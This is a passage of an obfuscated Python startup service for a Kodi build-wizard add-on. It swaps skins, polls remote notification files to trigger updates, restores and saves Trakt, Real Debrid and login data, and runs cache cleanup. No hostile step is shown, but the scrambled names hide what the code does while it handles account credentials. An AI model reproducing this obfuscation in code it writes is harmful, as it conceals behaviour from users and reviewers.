		if OO0O0OOOOO0OOOO0O .has_key ('result'):#line:1498
			if OO0O0OOOOO0OOOO0O ['result'].has_key ('value'):#line:1499
				return OO0O0OOOOO0OOOO0O ['result']['value']#line:1500
	except :#line:1501
		pass #line:1502
	return None #line:1503
def setNew (OO0O0O00000O0OOOO ,OOOO0OO000OO00O00 ):#line:1506
	try :#line:1507
		OO0O0O00000O0OOOO ='"%s"'%OO0O0O00000O0OOOO #line:1508
		OOOO0OO000OO00O00 ='"%s"'%OOOO0OO000OO00O00 #line:1509
		OO0OO0OOOOOOO0OO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O0O00000O0OOOO ,OOOO0OO000OO00O00 )#line:1510
		OOOO000O0O0OO000O =xbmc .executeJSONRPC (OO0OO0OOOOOOO0OO0 )#line:1512
	except :#line:1513
		pass #line:1514
	return None #line:1515
def idle ():#line:1516
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:1517
def fixfont ():#line:1518
	OO00O0O0O000OOOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1519
	OO0000O0O00OOOO0O =json .loads (OO00O0O0O000OOOO0 );#line:1521
	OO000O000000O00O0 =OO0000O0O00OOOO0O ["result"]["settings"]#line:1522
	OOO0OOOOO0OOO0OO0 =[OOOO00OO000O0O0O0 for OOOO00OO000O0O0O0 in OO000O000000O00O0 if OOOO00OO000O0O0O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1524
	O0OOO00OO00O00O00 =OOO0OOOOO0OOO0OO0 ["options"];#line:1525
	O0OOOOOOOO0OOO0OO =OOO0OOOOO0OOO0OO0 ["value"];#line:1526
	OOOO000O0O0OOOOO0 =[O0O00O0000OOOO00O for (O0O00O0000OOOO00O ,OOOOO00000OOO0OOO )in enumerate (O0OOO00OO00O00O00 )if OOOOO00000OOO0OOO ["value"]==O0OOOOOOOO0OOO0OO ][0 ];#line:1528
	O000OO0OOOOO00OOO =(OOOO000O0O0OOOOO0 +1 )%len (O0OOO00OO00O00O00 )#line:1530
	OOO00OO0000O0000O =O0OOO00OO00O00O00 [O000OO0OOOOO00OOO ]["value"]#line:1532
	O0O0OOOO0O00O0O00 =O0OOO00OO00O00O00 [O000OO0OOOOO00OOO ]["label"]#line:1533
	OOOOOO0O00OOO0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1535
	try :#line:1537
		O000000OO0OO0O000 =json .loads (OOOOOO0O00OOO0OOO );#line:1538
		if O000000OO0OO0O000 ["result"]!=True :#line:1540
			raise Exception #line:1541
	except :#line:1542
		sys .stderr .write ("Error switching audio output device")#line:1543
		raise Exception #line:1544
def checkSkin ():#line:1547
	wiz .log ("[Build Check] Invalid Skin Check Start")#line:1548
	O0O0O0O00OO000OO0 =wiz .getS ('defaultskin')#line:1549
	OOO0OOOOO0OO0000O =wiz .getS ('defaultskinname')#line:1550
	OO00OOO0000OO000O =wiz .getS ('defaultskinignore')#line:1551
	OO0O0OO00OO0O00O0 =False #line:1552
	if not O0O0O0O00OO000OO0 =='':#line:1553
		if os .path .exists (os .path .join (ADDONS ,O0O0O0O00OO000OO0 )):#line:1554
			if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to set the skin back to:[/COLOR]",'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOOOO0OO0000O )):#line:1555
				OO0O0OO00OO0O00O0 =O0O0O0O00OO000OO0 #line:1556
				OOOO0OO00OO0O00O0 =OOO0OOOOO0OO0000O #line:1557
			else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true');OO0O0OO00OO0O00O0 =False #line:1558
		else :wiz .setS ('defaultskin','');wiz .setS ('defaultskinname','');O0O0O0O00OO000OO0 ='';OOO0OOOOO0OO0000O =''#line:1559
	if O0O0O0O00OO000OO0 =='':#line:1560
		OOO0000000OO0OOO0 =[]#line:1561
		OO0OOO0OOO0O0OO00 =[]#line:1562
		for O00OOOO00OO0OO000 in glob .glob (os .path .join (ADDONS ,'skin.*/')):#line:1563
			O0000O0O00000OO0O ="%s/addon.xml"%O00OOOO00OO0OO000 #line:1564
			if os .path .exists (O0000O0O00000OO0O ):#line:1565
				OO00000O0O000O0OO =open (O0000O0O00000OO0O ,mode ='r');O0O0OOOO00OO000O0 =OO00000O0O000O0OO .read ().replace ('\n','').replace ('\r','').replace ('\t','');OO00000O0O000O0OO .close ();#line:1566
				O00O00OOOOOOO0000 =wiz .parseDOM (O0O0OOOO00OO000O0 ,'addon',ret ='id')#line:1567
				O000O00O000000000 =wiz .parseDOM (O0O0OOOO00OO000O0 ,'addon',ret ='name')#line:1568
				wiz .log ("%s: %s"%(O00OOOO00OO0OO000 ,str (O00O00OOOOOOO0000 [0 ])),xbmc .LOGNOTICE )#line:1569
				if len (O00O00OOOOOOO0000 )>0 :OO0OOO0OOO0O0OO00 .append (str (O00O00OOOOOOO0000 [0 ]));OOO0000000OO0OOO0 .append (str (O000O00O000000000 [0 ]))#line:1570
				else :wiz .log ("ID not found for %s"%O00OOOO00OO0OO000 ,xbmc .LOGNOTICE )#line:1571
			else :wiz .log ("ID not found for %s"%O00OOOO00OO0OO000 ,xbmc .LOGNOTICE )#line:1572
		if len (OO0OOO0OOO0O0OO00 )>0 :#line:1573
			if len (OO0OOO0OOO0O0OO00 )>1 :#line:1574
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to view a list of avaliable skins?[/COLOR]"):#line:1575
					O0OOO0O0OOO0OO0OO =DIALOG .select ("Select skin to switch to!",OOO0000000OO0OOO0 )#line:1576
					if O0OOO0O0OOO0OO0OO ==-1 :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:1577
					else :#line:1578
						OO0O0OO00OO0O00O0 =OO0OOO0OOO0O0OO00 [O0OOO0O0OOO0OO0OO ]#line:1579
						OOOO0OO00OO0O00O0 =OOO0000000OO0OOO0 [O0OOO0O0OOO0OO0OO ]#line:1580
				else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:1581
	if OO0O0OO00OO0O00O0 :#line:1588
		skinSwitch .swapSkins (OO0O0OO00OO0O00O0 )#line:1589
		O0OO000OO00000000 =0 #line:1590
		xbmc .sleep (1000 )#line:1591
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO000OO00000000 <150 :#line:1592
			O0OO000OO00000000 +=1 #line:1593
			xbmc .sleep (200 )#line:1594
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:1596
			wiz .ebi ('SendClick(11)')#line:1597
			wiz .lookandFeelData ('restore')#line:1598
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Skin Swap Timed Out![/COLOR]'%COLOR2 )#line:1599
	wiz .log ("[Build Check] Invalid Skin Check End",xbmc .LOGNOTICE )#line:1600
while xbmc .Player ().isPlayingVideo ():#line:1602
	xbmc .sleep (1000 )#line:1603
if KODIV >=17 :#line:1605
	NOW =datetime .now ()#line:1606
	temp =wiz .getS ('kodi17iscrap')#line:1607
	if not temp =='':#line:1608
		if temp >str (NOW -timedelta (minutes =2 )):#line:1609
			wiz .log ("Killing Start Up Script")#line:1610
			sys .exit ()#line:1611
	wiz .log ("%s"%(NOW ))#line:1612
	wiz .setS ('kodi17iscrap',str (NOW ))#line:1613
	xbmc .sleep (1000 )#line:1614
	if not wiz .getS ('kodi17iscrap')==str (NOW ):#line:1615
		wiz .log ("Killing Start Up Script")#line:1616
		sys .exit ()#line:1617
	else :#line:1618
		wiz .log ("Continuing Start Up Script")#line:1619
wiz .log ("[Path Check] Started",xbmc .LOGNOTICE )#line:1621
path =os .path .split (ADDONPATH )#line:1622
if not ADDONID ==path [1 ]:DIALOG .ok (ADDONTITLE ,'[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]'%COLOR2 ,'[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,ADDONID ),'[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,path ));wiz .log ("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s "%(ADDONID ,path ))#line:1623
else :wiz .log ("[Path Check] Good!",xbmc .LOGNOTICE )#line:1624
if KODIADDONS in ADDONPATH :#line:1627
	wiz .log ("Copying path to addons dir",xbmc .LOGNOTICE )#line:1628
	if not os .path .exists (ADDONS ):os .makedirs (ADDONS )#line:1629
	newpath =xbmc .translatePath (os .path .join ('special://home/addons/',ADDONID ))#line:1630
	if os .path .exists (newpath ):#line:1631
		wiz .log ("Folder already exists, cleaning House",xbmc .LOGNOTICE )#line:1632
		wiz .cleanHouse (newpath )#line:1633
		wiz .removeFolder (newpath )#line:1634
	try :#line:1635
		wiz .copytree (ADDONPATH ,newpath )#line:1636
	except Exception as e :#line:1637
		pass #line:1638
	wiz .forceUpdate (True )#line:1639
try :#line:1641
	mybuilds =xbmc .translatePath (MYBUILDS )#line:1642
	if not os .path .exists (mybuilds ):xbmcvfs .mkdirs (mybuilds )#line:1643
except :#line:1644
	pass #line:1645
wiz .log ("[Installed Check] Started",xbmc .LOGNOTICE )#line:1647
if KODIV >=17 and SKIN in ['skin.confluence','skin.estuary','skin.estouchy']and not BUILDNAME =="":#line:1651
			wiz .kodi17Fix ()#line:1652
			fix18update ()#line:1653
			fix17update ()#line:1654
if INSTALLED =='true':#line:1657
    input =(ADDON .getSetting ("auto_rd"))#line:1658
    if KEEPTRAKT =='true':traktit .traktIt ('restore','all');wiz .log ('[Installed Check] Restoring Trakt Data',xbmc .LOGNOTICE )#line:1660
    if KEEPREAL =='true':debridit .debridIt ('restore','all');wiz .log ('[Installed Check] Restoring Real Debrid Data',xbmc .LOGNOTICE )#line:1661
    if input =='true':loginit .loginIt ('restore','all');wiz .log ('[Installed Check] Restoring Login Data',xbmc .LOGNOTICE )#line:1662
    wiz .clearS ('install')#line:1663
wiz .log ("[Notifications] Started",xbmc .LOGNOTICE )#line:1748
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:1750
	STARTP2 ()#line:1752
	if not NOTIFY =='true':#line:1753
		url =wiz .workingURL (NOTIFICATION )#line:1754
		if url ==True :#line:1755
			id ,msg =wiz .splitNotify (NOTIFICATION )#line:1756
			if not id ==False :#line:1757
				try :#line:1758
					id =int (id );NOTEID =int (NOTEID )#line:1759
					if id ==NOTEID :#line:1760
						if NOTEDISMISS =='false':#line:1761
							debridit .debridIt ('update','all')#line:1762
							traktit .traktIt ('update','all')#line:1763
							checkidupdate ()#line:1764
						else :wiz .log ("[Notifications] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:1765
					elif id >NOTEID :#line:1766
						wiz .log ("[Notifications] id: %s"%str (id ),xbmc .LOGNOTICE )#line:1767
						wiz .setS ('noteid',str (id ))#line:1768
						wiz .setS ('notedismiss','false')#line:1769
						debridit .debridIt ('update','all')#line:1771
						traktit .traktIt ('update','all')#line:1772
						checkidupdate ()#line:1773
						wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:1775
				except Exception as e :#line:1776
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1777
			else :wiz .log ("[Notifications] Text File not formated Correctly")#line:1778
		else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,url ),xbmc .LOGNOTICE )#line:1779
	else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:1780
else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:1781
wiz .log ("[Notifications2] Started",xbmc .LOGNOTICE )#line:1783
if ENABLE =='No':#line:1784
	if not NOTIFY2 =='true':#line:1785
		url =wiz .workingURL (NOTIFICATION2 )#line:1786
		if url ==True :#line:1787
			id ,msg =wiz .splitNotify (NOTIFICATION2 )#line:1788
			if not id ==False :#line:1789
				try :#line:1790
					id =int (id );NOTEID2 =int (NOTEID2 )#line:1791
					if id ==NOTEID2 :#line:1792
						if NOTEDISMISS2 =='false':#line:1793
							checkvictory ()#line:1794
						else :wiz .log ("[Notifications2] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:1795
					elif id >NOTEID2 :#line:1796
						wiz .log ("[Notifications2] id: %s"%str (id ),xbmc .LOGNOTICE )#line:1797
						wiz .setS ('noteid2',str (id ))#line:1798
						wiz .setS ('notedismiss2','false')#line:1799
						checkvictory ()#line:1800
						wiz .log ("[Notifications2] Complete",xbmc .LOGNOTICE )#line:1801
				except Exception as e :#line:1802
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1803
			else :wiz .log ("[Notifications2] Text File not formated Correctly")#line:1804
		else :wiz .log ("[Notifications2] URL(%s): %s"%(NOTIFICATION2 ,url ),xbmc .LOGNOTICE )#line:1805
	else :wiz .log ("[Notifications2] Turned Off",xbmc .LOGNOTICE )#line:1806
else :wiz .log ("[Notifications2] Not Enabled",xbmc .LOGNOTICE )#line:1807
wiz .log ("[Notifications3] Started",xbmc .LOGNOTICE )#line:1809
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18"or BUILDNAME ==" Kodi Premium":#line:1810
	if not NOTIFY3 =='true':#line:1811
		url =wiz .workingURL (NOTIFICATION3 )#line:1812
		if url ==True :#line:1813
			id ,msg =wiz .splitNotify (NOTIFICATION3 )#line:1814
			if not id ==False :#line:1815
				try :#line:1816
					id =int (id );NOTEID3 =int (NOTEID3 )#line:1817
					if id ==NOTEID3 :#line:1818
						if NOTEDISMISS3 =='false':#line:1819
							notify .notification3 (msg )#line:1820
						else :wiz .log ("[Notifications3] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:1821
					elif id >NOTEID3 :#line:1822
						wiz .log ("[Notifications3] id: %s"%str (id ),xbmc .LOGNOTICE )#line:1823
						wiz .setS ('noteid3',str (id ))#line:1824
						wiz .setS ('notedismiss3','false')#line:1825
						notify .notification3 (msg =msg )#line:1826
						wiz .log ("[Notifications3] Complete",xbmc .LOGNOTICE )#line:1827
				except Exception as e :#line:1828
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1829
			else :wiz .log ("[Notifications3] Text File not formated Correctly")#line:1830
		else :wiz .log ("[Notifications3] URL(%s): %s"%(NOTIFICATION3 ,url ),xbmc .LOGNOTICE )#line:1831
	else :wiz .log ("[Notifications3] Turned Off",xbmc .LOGNOTICE )#line:1832
else :wiz .log ("[Notifications3] Not Enabled",xbmc .LOGNOTICE )#line:1833
wiz .log ("[Trakt Data] Started",xbmc .LOGNOTICE )#line:1834
if KEEPTRAKT =='true':#line:1835
	if TRAKTSAVE <=str (TODAY ):#line:1836
		wiz .log ("[Trakt Data] Saving all Data",xbmc .LOGNOTICE )#line:1837
		traktit .autoUpdate ('all')#line:1838
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:1839
	else :#line:1840
		wiz .log ("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s"%(TRAKTSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1841
else :wiz .log ("[Trakt Data] Not Enabled",xbmc .LOGNOTICE )#line:1842
wiz .log ("[Real Debrid Data] Started",xbmc .LOGNOTICE )#line:1844
if KEEPREAL =='true':#line:1845
	if REALSAVE <=str (TODAY ):#line:1846
		wiz .log ("[Real Debrid Data] Saving all Data",xbmc .LOGNOTICE )#line:1847
		debridit .autoUpdate ('all')#line:1848
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:1849
	else :#line:1850
		wiz .log ("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s"%(REALSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1851
else :wiz .log ("[Real Debrid Data] Not Enabled",xbmc .LOGNOTICE )#line:1852
wiz .log ("[Login Data] Started",xbmc .LOGNOTICE )#line:1854
if KEEPLOGIN =='true':#line:1855
	if LOGINSAVE <=str (TODAY ):#line:1856
		wiz .log ("[Login Data] Saving all Data",xbmc .LOGNOTICE )#line:1857
		loginit .autoUpdate ('all')#line:1858
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:1859
	else :#line:1860
		wiz .log ("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s"%(LOGINSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1861
else :wiz .log ("[Login Data] Not Enabled",xbmc .LOGNOTICE )#line:1862
wiz .clearCache (True )#line:1863
wiz .log ("[Auto Clean Up] Started",xbmc .LOGNOTICE )#line:1864
if AUTOCLEANUP =='false':#line:1865
	service =False #line:1866
	days =[TODAY ,TOMORROW ,THREEDAYS ,ONEWEEK ]#line:1867
	feq =int (float (AUTOFEQ ))#line:1868
	if AUTONEXTRUN <=str (TODAY )or feq ==0 :#line:1869
		service =True #line:1870
		next_run =days [feq ]#line:1871
		wiz .setS ('nextautocleanup',str (next_run ))#line:1872
	else :wiz .log ("[Auto Clean Up] Next Clean Up %s"%AUTONEXTRUN ,xbmc .LOGNOTICE )#line:1873
	if service ==True :#line:1874
		AUTOCACHE =wiz .getS ('clearcache')#line:1875
		AUTOPACKAGES =wiz .getS ('clearpackages')#line:1876
		AUTOTHUMBS =wiz .getS ('clearthumbs')#line:1877
		if AUTOCACHE =='true':wiz .log ('[Auto Clean Up] Cache: On',xbmc .LOGNOTICE );wiz .clearCache (True )#line:1878
		else :wiz .log ('[Auto Clean Up] Cache: Off',xbmc .LOGNOTICE )#line:1879
		if AUTOTHUMBS =='true':wiz .log ('[Auto Clean Up] Old Thumbs: On',xbmc .LOGNOTICE );wiz .oldThumbs ()#line:1880
		else :wiz .log ('[Auto Clean Up] Old Thumbs: Off',xbmc .LOGNOTICE )#line:1881
		if AUTOPACKAGES =='true':wiz .log ('[Auto Clean Up] Packages: On',xbmc .LOGNOTICE );wiz .clearPackagesStartup ()#line:1882
		else :wiz .log ('[Auto Clean Up] Packages: Off',xbmc .LOGNOTICE )#line:1883
else :wiz .log ('[Auto Clean Up] Turned off',xbmc .LOGNOTICE )#line:1884
wiz .setS ('kodi17iscrap','')#line:1886
for dirpath ,dirnames ,filenames in os .walk (packagesdir ):#line:1955
	count =0 #line:1956
	for f in filenames :#line:1957
		count +=1 #line:1958
		fp =os .path .join (dirpath ,f )#line:1959
		total_size +=os .path .getsize (fp )#line:1960
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1961
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:1968
	for f2 in filenames2 :#line:1969
		fp2 =os .path .join (dirpath2 ,f2 )#line:1970
		total_size2 +=os .path .getsize (fp2 )#line:1971
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1972
if int (total_sizetext2 )>filesize_thumb :#line:1974
		maintenance .deleteThumbnails ()#line:1976
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1978
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1979
if notify_mode =='true':xbmc .executebuiltin ('XBMC.Notification(%s, %s, %s, %s)'%('Maintenance Status','Packages: '+str (total_sizetext )+' MB' ' - Images: '+str (total_sizetext2 )+' MB','5000',iconpath ))#line:1981
time .sleep (3 )#line:1982
if not os .path .exists (os .path .join (ADDONDATA ,'4.2.0'))and not BUILDNAME =="":#line:1984
        display_Votes ()#line:1985
        file =open (os .path .join (ADDONDATA ,'4.2.0'),'w')#line:1987
        file .write (str ('Done'))#line:1989
        file .close ()#line:1990
tele =(ADDON .getSetting ("auto_tele"))#line:1995
if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:1997
    if tele =='true':#line:1999
        xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=5&url=www)")#line:2000
